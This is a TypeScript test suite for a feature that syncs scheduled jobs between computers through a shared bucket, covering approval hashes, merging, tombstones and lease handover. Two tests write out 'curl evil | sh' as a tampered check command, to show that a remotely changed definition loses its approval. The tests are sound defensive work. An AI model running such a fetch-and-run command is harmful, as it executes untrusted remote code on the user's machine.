import { describe, test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'fs';
import os from 'os';
import path from 'path';
import { CHECK_OUTPUT_KEEP, createSchedule, planScheduleCheck, recordRun, type ScheduleState } from '../src/main/schedule.ts';
import {
  chargeRun, collectBucketSchedules, definitionApproved, parseScheduleObjectRel, scheduleObjectRel, definitionHash, isRunnerHere, mergeSchedule, parseRemoteSchedule, planScheduleSync, remoteBody,
  stampLocalWrite, tombstoneBody, type RemoteSchedule,
} from '../src/main/scheduleSync.ts';
import * as scheduleStore from '../src/main/scheduleStore.ts';

const A = { id: 'devA', name: 'laptop-a' };
const B = { id: 'devB', name: 'desk-b' };
const T0 = 1_700_000_000_000;

function job(over: Partial<ScheduleState> = {}): ScheduleState {
  return {
    ...createSchedule('s1', { prompt: 'check build', kind: 'interval', everySec: 3600, maxRuns: 10, until: 'green', checkCommand: 'node check.js' }, T0),
    runner: A.id, runnerName: A.name, runnerChangedAt: T0, statusBy: A.id, statusAt: T0,
    ...over,
  };
}

describe('approval and creator (第 12 轮：哪台在线就由哪台跑)', () => {
  test('only a definition confirmed on this computer counts; any change to it needs confirming again', () => {
    const s = job();
    const hash = definitionHash(s);
    assert.equal(definitionApproved(s, hash), true);
    assert.equal(definitionApproved(s, undefined), false, 'came from the bucket, never confirmed here');
    assert.equal(definitionApproved({ ...s, spec: { ...s.spec, checkCommand: 'curl evil | sh' } }, hash), false, 'definition changed since confirmation');
    assert.equal(definitionApproved({ ...s, runner: B.id, runs: 9 }, hash), true, 'who ran it last / run state do not matter');
  });

  test('a new file gets creator = this computer; an old file\'s runner becomes its creator', () => {
    const { runner: _r, runnerName: _n, runnerChangedAt: _c, ...fresh } = job();
    const created = stampLocalWrite(null, fresh as ScheduleState, A, T0 + 5);
    assert.equal(created.creator, A.id);
    assert.equal(created.creatorName, A.name);
    assert.equal(created.runner, A.id, 'not run yet: "last run by" = its creator');
    const legacy = job({ runner: 'devOld', runnerName: 'old-mac' });
    const migrated = stampLocalWrite(legacy, legacy, B, T0 + 6);
    assert.equal(migrated.creator, 'devOld');
    assert.equal(migrated.creatorName, 'old-mac');
    assert.equal(isRunnerHere(migrated, 'devOld'), true);
  });
});

describe('stampLocalWrite', () => {
  test('a stale write does not undo a newer pause / takeover that landed meanwhile', () => {
    const before = job();
    const onDisk = { ...before, paused: true, pausedChangedAt: T0 + 50, runner: B.id, runnerName: B.name, runnerChangedAt: T0 + 60 };
    const staleRun = recordRun(before, T0 + 70);
    const out = stampLocalWrite(onDisk, staleRun, A, T0 + 70);
    assert.equal(out.paused, true);
    assert.equal(out.runner, B.id);
    assert.equal(out.runs, 1);
    assert.equal(out.statusBy, A.id, 'this machine wrote that run');
  });

  test('control ops get a timestamp; run state records who wrote it', () => {
    const prev = job();
    const paused = stampLocalWrite(prev, { ...prev, paused: true }, B, T0 + 9);
    assert.equal(paused.pausedChangedAt, T0 + 9);
    assert.equal(paused.statusAt, T0, 'pausing is not a run');
    const extended = stampLocalWrite(prev, { ...prev, expiresAt: T0 + 99 }, B, T0 + 11);
    assert.equal(extended.expiryChangedAt, T0 + 11);
  });
});

describe('mergeSchedule', () => {
  test('run state (and "last run by") follows the newer planned slot, whichever computer ran it', () => {
    const ranOnB = chargeRun(job(), T0 + 3600_000, B, T0 + 3600_500);
    const onA = mergeSchedule(job(), ranOnB, A.id).state;
    assert.equal(onA.runs, 1);
    assert.equal(onA.runner, B.id);
    assert.equal(onA.lastRunFor, T0 + 3600_000);
    /* a stale copy never rolls it back */
    assert.equal(mergeSchedule(onA, job(), A.id).state.runs, 1);
    /* same slot: the later write wins */
    const later = { ...ranOnB, lastError: 'send failed', statusAt: (ranOnB.statusAt ?? 0) + 10 };
    assert.equal(mergeSchedule(ranOnB, later, A.id).state.lastError, 'send failed');
  });

  test('control ops: last one wins, from any machine (pause on B pauses A)', () => {
    const onA = job();
    const onB = { ...job(), paused: true, pausedChangedAt: T0 + 30 };
    assert.equal(mergeSchedule(onA, onB, A.id).state.paused, true);
    const resumedOnA = { ...onA, paused: false, pausedChangedAt: T0 + 40 };
    assert.equal(mergeSchedule(resumedOnA, onB, A.id).state.paused, false, 'the later resume wins');
    const extOnB = { ...job(), expiresAt: T0 + 9e6, expiryChangedAt: T0 + 50 };
    assert.equal(mergeSchedule({ ...onA, expiresAt: T0 + 1e6 }, extOnB, A.id).state.expiresAt, T0 + 9e6);
  });

  test('a changed definition from the bucket is taken but flagged, so this computer must confirm it again before running', () => {
    const onA = job();
    const hash = definitionHash(onA);
    const changed = { ...job(), spec: { ...onA.spec, checkCommand: 'curl evil | sh', prompt: 'other' } };
    const r = mergeSchedule(onA, changed, A.id);
    assert.equal(r.notes.defChanged, true);
    assert.equal(r.state.spec.checkCommand, 'curl evil | sh');
    assert.equal(definitionApproved(r.state, hash), false, 'no longer runs here until confirmed');
    assert.equal(mergeSchedule(onA, onA, A.id).notes.defChanged, undefined);
  });

  test('creator: the local record wins; an old file\'s runner stands in; sessionId is always local', () => {
    const local = job({ creator: A.id, creatorName: A.name });
    const remote = { ...job({ creator: 'devX', creatorName: 'x' }), sessionId: 'other' };
    const m = mergeSchedule(local, remote, A.id).state;
    assert.equal(m.creator, A.id);
    assert.equal(m.sessionId, 's1');
    const { creator: _c, ...legacy } = job({ runner: 'devOld' });
    assert.equal(mergeSchedule(legacy as ScheduleState, remote, A.id).state.creator, 'devX', 'local has none: take the one from the bucket');
    assert.equal(mergeSchedule(legacy as ScheduleState, legacy as ScheduleState, A.id).state.creator, undefined, 'nothing invented (an unchanged pair stays unchanged)');
  });
});

describe('parseRemoteSchedule', () => {
  test('round trip, and tombstones', () => {
    const s = job();
    const p = parseRemoteSchedule(remoteBody('x1', s, T0), 'x1', 's1') as Extract<RemoteSchedule, { kind: 'live' }>;
    assert.equal(p.kind, 'live');
    assert.equal(p.state.spec.checkCommand, 'node check.js');
    assert.deepEqual(parseRemoteSchedule(tombstoneBody('x1', 's1', T0, A.id), 'x1', 's1'), { kind: 'deleted', at: T0 });
  });

  test('rejects mismatched ids / sessions, missing runner, bad specs, and drops unknown fields', () => {
    const s = job();
    assert.equal(parseRemoteSchedule(remoteBody('x1', s, T0), 'x2', 's1'), null);
    assert.equal(parseRemoteSchedule(remoteBody('x1', s, T0), 'x1', 's2'), null);
    const { runner: _r, ...noRunner } = s;
    assert.equal(parseRemoteSchedule(remoteBody('x1', noRunner as ScheduleState, T0), 'x1', 's1'), null);
    assert.equal(parseRemoteSchedule(remoteBody('x1', { ...s, spec: { ...s.spec, everySec: 1 } }, T0), 'x1', 's1'), null);
    assert.equal(parseRemoteSchedule('not json', 'x1', 's1'), null);
    const extra = parseRemoteSchedule(remoteBody('x1', { ...s, evil: 1 } as any, T0), 'x1', 's1') as any;
    assert.equal(extra.state.evil, undefined);
  });
});

describe('planScheduleSync', () => {
  const live = (state: ScheduleState) => ({ sessionId: state.sessionId, parsed: { kind: 'live' as const, state } });

  test('tasks of sessions outside the sync scope are not uploaded (or pulled)', () => {
    const plan = planScheduleSync({
      me: A.id, local: [{ id: 'j1', state: job({ sessionId: 'nosync' }) }], tombstones: {},
      remote: new Map([['j2', live(job({ sessionId: 'nosync2' }))]]), inScope: () => false, upload: true,
    });
    assert.deepEqual(plan, []);
  });

  test('in scope: upload local-only, adopt remote-only', () => {
    const plan = planScheduleSync({
      me: A.id, local: [{ id: 'j1', state: job() }], tombstones: {},
      remote: new Map([['j2', live(job({ runner: B.id }))]]), inScope: (s) => s === 's1', upload: true,
    });
    assert.deepEqual(plan.map((a) => `${a.op}:${a.id}`), ['put:j1', 'write:j2']);
  });

  test('restore mode pulls but never uploads', () => {
    const plan = planScheduleSync({
      me: A.id, local: [{ id: 'j1', state: job() }], tombstones: {},
      remote: new Map([['j2', live(job({ runner: B.id }))]]), inScope: () => true, upload: false,
    });
    assert.deepEqual(plan.map((a) => `${a.op}:${a.id}`), ['write:j2']);
  });

  test('a remote tombstone deletes the local copy; a local tombstone is pushed and never re-adopted', () => {
    const p1 = planScheduleSync({
      me: A.id, local: [{ id: 'j1', state: job() }], tombstones: {},
      remote: new Map([['j1', { sessionId: 's1', parsed: { kind: 'deleted', at: T0 } }]]), inScope: () => true, upload: true,
    });
    assert.deepEqual(p1.map((a) => a.op), ['delete']);
    const p2 = planScheduleSync({
      me: A.id, local: [], tombstones: { j1: { at: T0, sessionId: 's1' } },
      remote: new Map([['j1', live(job())]]), inScope: () => true, upload: true,
    });
    assert.deepEqual(p2.map((a) => a.op), ['put-tombstone'], 'not written back locally');
    /* a session that was deleted (no longer in scope) still pushes its tombstones */
    const p3 = planScheduleSync({
      me: A.id, local: [], tombstones: { j1: { at: T0, sessionId: 's1' } },
      remote: new Map([['j1', live(job())]]), inScope: () => false, upload: true,
    });
    assert.deepEqual(p3.map((a) => a.op), ['put-tombstone']);
  });

  test('unchanged on both sides: nothing to do', () => {
    const s = job();
    assert.deepEqual(planScheduleSync({
      me: A.id, local: [{ id: 'j1', state: s }], tombstones: {}, remote: new Map([['j1', live(s)]]), inScope: () => true, upload: true,
    }), []);
  });

  test('a remote copy filed under another session is left alone', () => {
    const plan = planScheduleSync({
      me: A.id, local: [{ id: 'j1', state: job() }], tombstones: {},
      remote: new Map([['j1', { sessionId: 'other', parsed: { kind: 'deleted', at: T0 } }]]), inScope: () => true, upload: true,
    });
    assert.deepEqual(plan, []);
  });
});

describe('last check result', () => {
  test('recorded on every outcome; actions and exit-code meaning unchanged; output kept as a short tail', () => {
    const s = job();
    const ok = planScheduleCheck(s, { status: 'exited', code: 0, output: 'green\n' }, T0, 'en');
    assert.equal(ok.action, 'achieved');
    assert.deepEqual(ok.state.lastCheck, { at: T0, result: 'achieved', code: 0, output: 'green' });
    const first = planScheduleCheck(s, { status: 'exited', code: 1, output: '2 failing' }, T0, 'en');
    assert.equal(first.action, 'wake');
    assert.equal(first.state.lastCheck?.result, 'changed');
    const same = planScheduleCheck(first.state, { status: 'exited', code: 1, output: '2 failing' }, T0 + 1, 'en');
    assert.equal(same.action, 'skip', 'unchanged output still does not wake');
    assert.deepEqual(same.state.lastCheck, { at: T0 + 1, result: 'unchanged', code: 1, output: '2 failing' });
    const err = planScheduleCheck(s, { status: 'exited', code: 3, output: 'x'.repeat(1000) }, T0, 'en');
    assert.equal(err.action, 'wake');
    assert.equal(err.state.lastCheck?.result, 'error');
    assert.equal(err.state.lastCheck?.code, 3);
    assert.equal(err.state.lastCheck!.output.length, CHECK_OUTPUT_KEEP + 1, 'tail only (with a leading …)');
    assert.equal(planScheduleCheck(s, { status: 'timeout', output: '' }, T0, 'en').state.lastCheck?.code, null);
  });

  test('synced as run state: the computer that ran the newer slot supplies the last check', () => {
    const ranOnA = chargeRun({ ...planScheduleCheck(job(), { status: 'exited', code: 1, output: 'still red' }, T0 + 100, 'en').state }, T0 + 100, A, T0 + 100);
    const onB = mergeSchedule(job(), ranOnA, B.id).state;
    assert.equal(onB.lastCheck?.output, 'still red');
    const ranOnB = chargeRun({ ...planScheduleCheck(onB, { status: 'exited', code: 1, output: 'green soon' }, T0 + 3700_000, 'en').state }, T0 + 3700_000, B, T0 + 3700_000);
    assert.equal(mergeSchedule(ranOnA, ranOnB, A.id).state.lastCheck?.output, 'green soon');
    assert.equal(mergeSchedule(ranOnB, ranOnA, B.id).state.lastCheck?.output, 'green soon', 'an older slot never rolls it back');
  });

  test('parsed from the bucket; a malformed one is dropped', () => {
    const s = { ...job(), lastCheck: { at: T0, result: 'unchanged' as const, code: 1, output: 'same' } };
    const p = parseRemoteSchedule(remoteBody('x1', s, T0), 'x1', 's1') as Extract<RemoteSchedule, { kind: 'live' }>;
    assert.deepEqual(p.state.lastCheck, s.lastCheck);
    const bad = parseRemoteSchedule(remoteBody('x1', { ...s, lastCheck: { at: 'x', result: 'evil' } } as any, T0), 'x1', 's1') as any;
    assert.equal(bad.state.lastCheck, undefined);
  });
});

describe('pause / resume across computers', () => {
  test('an auto-pause (check errors) from the computer that ran the check, and a later user resume elsewhere, both sync by time', () => {
    const base = job({ checkErrors: 2 });
    const autoPaused = stampLocalWrite(base, { ...base, checkErrors: 3, paused: true, pausedBy: 'check-errors' }, A, T0 + 600);
    const onB = mergeSchedule(base, autoPaused, B.id).state;
    assert.equal(onB.paused, true);
    assert.equal(onB.pausedBy, 'check-errors');
    const resumedOnB = stampLocalWrite(onB, { ...onB, paused: false, pausedBy: null }, B, T0 + 700);
    assert.equal(mergeSchedule(autoPaused, resumedOnB, A.id).state.paused, false);
  });
});

describe('a check command that finishes after this computer lost the lease (real async flow)', () => {
  /** Runs the real runScheduleCheck; while the command is "running", the lease renewal finds it was overwritten. */
  async function runWithTakeoverMidCheck(result: any, start: Partial<ScheduleState> = {}) {
    const { runScheduleCheck } = await import('../src/main/scheduleCheckRun.ts');
    const mine = job({ lastRunAt: T0 - 7200_000, ...start });
    const hash = definitionHash(mine);
    let disk: ScheduleState | null = mine;
    let lost = false;
    const writes: ScheduleState[] = [];
    const changed: ScheduleState[] = [];
    const notes: string[] = [];
    const logs: string[] = [];
    const out = await runScheduleCheck('j1', mine, {
      now: () => T0,
      read: () => disk,
      write: (_id, s) => { disk = s; writes.push(s); },
      runCheck: async () => {
        await new Promise((r) => setTimeout(r, 5));
        lost = true;   // the renewal (every 60 s) found another computer had overwritten the lease
        return result;
      },
      changed: (_id, s) => { changed.push(s); },
      noteUser: (_sid, text) => { notes.push(text); },
      log: (m) => { logs.push(m); },
      stillRunsHere: (_id, s) => !lost && definitionApproved(s, hash),
      lang: 'en',
    });
    return { out, disk: disk!, writes, changed, notes, logs };
  }

  test('exit 0 does not mark the job achieved, and nothing is woken or broadcast', async () => {
    const r = await runWithTakeoverMidCheck({ status: 'exited', code: 0, output: 'green' });
    assert.equal(r.out, null);
    assert.equal(r.disk.terminal, null);
    assert.equal(r.writes.length, 1, 'only the pre-check timestamp, written while still holding the lease');
    assert.deepEqual(r.changed, []);
    assert.ok(r.logs.some((m) => m.includes('handover') && m.includes('id=j1')));
  });

  test('the 3rd consecutive error does not pause the job or stamp a pause time', async () => {
    const r = await runWithTakeoverMidCheck({ status: 'exited', code: 2, output: 'boom' }, { checkErrors: 2 });
    assert.equal(r.out, null);
    assert.equal(r.disk.paused, false);
    assert.equal(r.disk.pausedChangedAt, undefined);
    assert.equal(r.disk.checkErrors, 2);
    assert.deepEqual(r.notes, []);
  });

  test('without a handover the same flow still records the result (control)', async () => {
    const { runScheduleCheck } = await import('../src/main/scheduleCheckRun.ts');
    const mine = job({ lastRunAt: T0 - 7200_000 });
    const hash = definitionHash(mine);
    let disk: ScheduleState | null = mine;
    const out = await runScheduleCheck('j1', mine, {
      now: () => T0, read: () => disk, write: (_id, s) => { disk = s; },
      runCheck: async () => ({ status: 'exited', code: 0, output: 'green' }),
      changed: () => {}, noteUser: () => {}, log: () => {},
      stillRunsHere: (_id, s) => definitionApproved(s, hash), lang: 'en',
    });
    assert.ok(out);
    assert.equal(disk!.terminal, 'achieved');
  });
});

describe('a queued wake re-checks the definition before it is sent', () => {
  test('a definition changed in the bucket while the wake waited → no longer confirmed here (the gate the queued wake checks)', () => {
    const mine = job();
    const hash = definitionHash(mine);
    assert.equal(definitionApproved(mine, hash), true);
    const merged = mergeSchedule(mine, { ...mine, spec: { ...mine.spec, prompt: 'changed elsewhere' } }, A.id);
    assert.equal(merged.notes.defChanged, true);
    assert.equal(definitionApproved(merged.state, hash), false);
  });
});

describe('deletion markers cannot be overwritten by a stale live upload', () => {
  /** A tiny in-memory bucket: rel → body. */
  function bucketPlan(bucket: Map<string, string>, me: string, local: Array<{ id: string; state: ScheduleState }>, tombstones: Record<string, { at: number; sessionId: string }>) {
    const listed = collectBucketSchedules([...bucket.keys()]);
    const remote = new Map<string, { sessionId: string; parsed: RemoteSchedule | null }>();
    for (const [id, d] of listed.deleted) remote.set(id, { sessionId: d.sessionId, parsed: { kind: 'deleted', at: T0 } });
    for (const [id, l] of listed.live) remote.set(id, { sessionId: l.sessionId, parsed: parseRemoteSchedule(bucket.get(l.rel)!, id, l.sessionId) });
    return planScheduleSync({ me, local, tombstones, remote, inScope: () => true, upload: true });
  }
  const apply = (bucket: Map<string, string>, plan: ReturnType<typeof planScheduleSync>, me: string) => {
    for (const a of plan) {
      if (a.op === 'put') bucket.set(scheduleObjectRel(a.sessionId, a.id), remoteBody(a.id, a.state, T0));
      if (a.op === 'put-tombstone') bucket.set(scheduleObjectRel(a.sessionId, a.id, true), tombstoneBody(a.id, a.sessionId, a.at, me));
    }
  };

  test('B read the old task, A uploads the deletion, then B uploads the old task: still deleted everywhere', () => {
    const bucket = new Map<string, string>();
    const s = job({ runner: B.id, runnerName: B.name });
    bucket.set(scheduleObjectRel('s1', 'j1'), remoteBody('j1', s, T0));
    /* B (runner) read the live object and is about to upload a run */
    const bRan = { ...recordRun(s, T0 + 50), statusBy: B.id, statusAt: T0 + 50 };
    /* A deletes it and syncs: the marker goes up as its own object */
    const aPlan = bucketPlan(bucket, A.id, [], { j1: { at: T0 + 40, sessionId: 's1' } });
    assert.deepEqual(aPlan.map((a) => a.op), ['put-tombstone']);
    apply(bucket, aPlan, A.id);
    /* B's stale upload of the live task lands afterwards */
    bucket.set(scheduleObjectRel('s1', 'j1'), remoteBody('j1', bRan, T0 + 60));
    assert.ok(bucket.has(scheduleObjectRel('s1', 'j1', true)), 'the marker survives the live upload');
    /* next round on B: deleted locally (and its queued run is gone with it) */
    assert.deepEqual(bucketPlan(bucket, B.id, [{ id: 'j1', state: bRan }], {}).map((a) => a.op), ['delete']);
    /* next round on A: nothing to adopt, nothing to re-upload */
    assert.deepEqual(bucketPlan(bucket, A.id, [], { j1: { at: T0 + 40, sessionId: 's1' } }), []);
    /* a third computer that never had it: remembers the deletion, never adopts */
    assert.deepEqual(bucketPlan(bucket, 'devC', [], {}).map((a) => a.op), ['remember-deleted']);
  });

  test('A lists an empty bucket and still uploads its marker; B\'s in-flight upload of the old task lands afterwards: still deleted', () => {
    const bucket = new Map<string, string>();
    const s = job({ runner: B.id, runnerName: B.name });
    /* B planned an upload of the task (bucket empty so far) but has not finished it */
    const bPlan = bucketPlan(bucket, B.id, [{ id: 'j1', state: s }], {});
    assert.deepEqual(bPlan.map((a) => a.op), ['put']);
    /* A, which deleted the task, lists the same empty bucket: the marker is uploaded anyway */
    const aPlan = bucketPlan(bucket, A.id, [], { j1: { at: T0 + 40, sessionId: 's1' } });
    assert.deepEqual(aPlan.map((a) => a.op), ['put-tombstone']);
    apply(bucket, aPlan, A.id);
    apply(bucket, bPlan, B.id);   // B's upload finishes after A's marker
    assert.deepEqual(bucketPlan(bucket, B.id, [{ id: 'j1', state: s }], {}).map((a) => a.op), ['delete']);
    assert.deepEqual(bucketPlan(bucket, 'devC', [], {}).map((a) => a.op), ['remember-deleted'], 'nobody downloads it again');
    assert.deepEqual(bucketPlan(bucket, A.id, [], { j1: { at: T0 + 40, sessionId: 's1' } }), [], 'marker already there: not re-uploaded');
  });

  test('object keys round-trip and the marker wins over the live object', () => {
    assert.deepEqual(parseScheduleObjectRel(scheduleObjectRel('s1', 'a b', true)), { sessionId: 's1', id: 'a b', deleted: true });
    assert.deepEqual(parseScheduleObjectRel(scheduleObjectRel('s1', 'j1')), { sessionId: 's1', id: 'j1', deleted: false });
    assert.equal(parseScheduleObjectRel('schedules/s1/x/y.json'), null);
    const c = collectBucketSchedules([scheduleObjectRel('s1', 'j1'), scheduleObjectRel('s1', 'j1', true), scheduleObjectRel('s1', 'j2')]);
    assert.deepEqual([...c.deleted.keys()], ['j1']);
    assert.deepEqual([...c.live.keys()], ['j2']);
  });
});

describe('scheduleStore with a local machine', () => {
  test('creation is approved, deletion leaves a tombstone, and a tombstoned id is never written back', () => {
    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'kl-schedsync-'));
    scheduleStore.setLocalScheduleMachine(A);
    try {
      const { runner: _r, runnerName: _n, runnerChangedAt: _c, statusBy: _b, statusAt: _a, ...fresh } = job();
      scheduleStore.writeSchedule('j1', fresh as ScheduleState, home);
      const saved = scheduleStore.readSchedule('j1', home)!.state;
      assert.equal(saved.creator, A.id);
      assert.equal(saved.runner, A.id);
      assert.equal(definitionApproved(saved, scheduleStore.readApprovedHash('j1', home)), true);
      /* adopted from the bucket (even one claiming this computer created it): written raw, never approved */
      scheduleStore.writeScheduleRaw('j2', job(), home);
      assert.equal(definitionApproved(scheduleStore.readSchedule('j2', home)!.state, scheduleStore.readApprovedHash('j2', home)), false);
      scheduleStore.removeSchedule('j1', home);
      assert.ok(scheduleStore.readScheduleTombstones(home).j1);
      scheduleStore.writeSchedule('j1', saved, home);
      assert.equal(scheduleStore.readSchedule('j1', home), null, 'not resurrected');
    } finally {
      scheduleStore.setLocalScheduleMachine(null);
      fs.rmSync(home, { recursive: true, force: true });
    }
  });
});
